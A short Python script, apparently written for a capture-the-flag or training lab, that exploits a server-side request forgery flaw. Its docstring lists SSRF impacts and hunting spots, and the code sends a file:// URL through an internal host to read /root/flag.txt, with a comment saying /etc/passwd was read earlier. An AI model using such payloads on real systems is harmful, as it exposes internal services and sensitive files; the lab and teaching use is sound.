#!/usr/bin/python3

"""
The first impelementation of SSRF

To make the implementation of SSRF, we usually
need to supply or modify URLS used by the target
application to read os submit data. Exploiting 
SSRF vulnerabilities can lead to:

	. Interacting with known internal systems
	. Discovering internal services via port scans
	. Disclosing local/sensitive data
	. Including files in the targe application
	. Leaking NetNTLM hashes using UNC Paths (Windows)
	. Achieving remote code execution.


We can usually find SSRF vulnerabilities in applications
that fetch remote resources. When hunting for SSRF vulne-
rabilities, we should look for:

	. Parts of HTTP requests, including URLs
	. File import such as HTML, PDFs, images, etc.
	. Remote server connections to fetch data
	. API specification imports
	. Dashboards including ping and similar functionalities
		to check server statuses


Note: Always keep in mind that web application fuzzing should
		be part of any penetration testing or bug bounty hunting
		activity. That being said, fuzzing should not be limited
		to usser input fields only. Extend fuzzing to parts of
		the HTTP requests as well, such as the User-Agent


"""


import requests
import sys




def first_implementation(url):
	
	try:
		"""
		We already found three vulnerabilities of SSRF and the listing of the content directory
		to get the flag only replace instead etc/passwd for root/flag.txt
		"""
		x = 5000
		params = {
		        "q":f"http://internal.app.local/load?q=file:://///root/flag.txt"
		        }
		response = requests.get(url=url+"load", params=params)
		if not "[Errno 111] Connection refused" in response.text:
		    print(x, response.text)
		else:
			pass
	except Exception as e:
		print(str(e))
		exit(1)

	except KeyboardInterrupt:
		exit(0)



def main():
	
	main_url = sys.argv[1]
	first_implementation(main_url)



if __name__ == "__main__":
	main()
